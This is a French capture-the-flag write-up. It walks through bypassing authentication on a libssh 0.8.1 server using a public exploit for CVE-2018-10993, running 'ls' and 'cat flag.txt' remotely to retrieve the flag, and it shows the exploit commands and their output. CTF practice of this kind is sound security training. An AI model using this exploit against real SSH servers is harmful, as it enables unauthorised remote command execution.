* * * * *
				          Rooter - Miscellaneous
* * * * *

**Enoncé:** 51.91.120.156 30000

Notre but est de trouver le flag. Nous avons une adresse **ip** et un **port**: Essayons une connexion **netcat**: 
`$ nc 51.91.120.156 30000`
> SSH-2.0-libssh_0.8.1
> 
> Bye Bye

Nous avons une version de **ssh** et de **libssh**. Essayons de voir ce que nous avons comme vulnérabilité dessus. Une recherche google dessus nous dévoile une vulnérabilité connu du nom de **libSSH authentication bypass** et de **CVE-2018-10993**. Un exploit datant de 2018:  [Voir l'exploit...](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d)
 Nous allons l'utiliser pour exploiter la faille:

`$ python3 cve-2018-10993.py -p 30000 51.91.120.156`

	     :: CVE-2018-10993 libSSH authentication bypass exploit.
	   Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
	   Mariusz B. / mgeeky '18, <mb@binary-offensive.com> 
	   v0.1
	
	[+] Connected to the target: 51.91.120.156:30000 
	[?] Obtained banner: "SSH-2.0-libssh\_0.8.1" 
	[+] Target seems to be VULNERABLE!

Nous allons ajouter les options `-c` et `-v` pour pouvoir exécuter des commandes en remote. Essayons de faire un simple directrories listing avec **ls** :

`$ python3 cve-2018-10993.py -p 30000 51.91.120.156 -v -c 'ls'`

	    :: CVE-2018-10993 libSSH authentication bypass exploit.
	  Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
	  Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
	  v0.1

	[+] Connected to the target: 51.91.120.156:30000 
	[?] Obtained banner: "SSH-2.0-libssh\_0.8.1" 
	[+] Target seems to be VULNERABLE! 
	[?] Connecting with 51.91.120.156:30000 ... 
	[+] Connected.

	$ ls 
	bin 
	boot 
	dev 
	etc 
	flag.txt 
	home 
	lib 
	lib64 
	media 
	mnt 
	opt 
	proc 
	root 
	run 
	sbin 
	srv 
	ssh_server_fork.patch 
	sys 
	tmp 
	usr 
	var

Nous observons la présence d'un fichier **flag.txt**, nous allons lire son contenu:

`$ python3 cve-2018-10993.py -p 30000 51.91.120.156 -v -c 'cat flag.txt'`

	    :: CVE-2018-10993 libSSH authentication bypass exploit.
	  Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
	  Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
	  v0.1

	[+] Connected to the target: 51.91.120.156:30000 
	[?] Obtained banner: "SSH-2.0-libssh\_0.8.1" 
	[+] Target seems to be VULNERABLE! 
	[?] Connecting with 51.91.120.156:30000 ... 
	[+] Connected.

	$ cat flag.txt 
	CTF_SSH_Exploiter 
	Socket exception: Bad file descriptor (9)

Bingo nous avons le flag: **CTF_SSH_Exploiter**

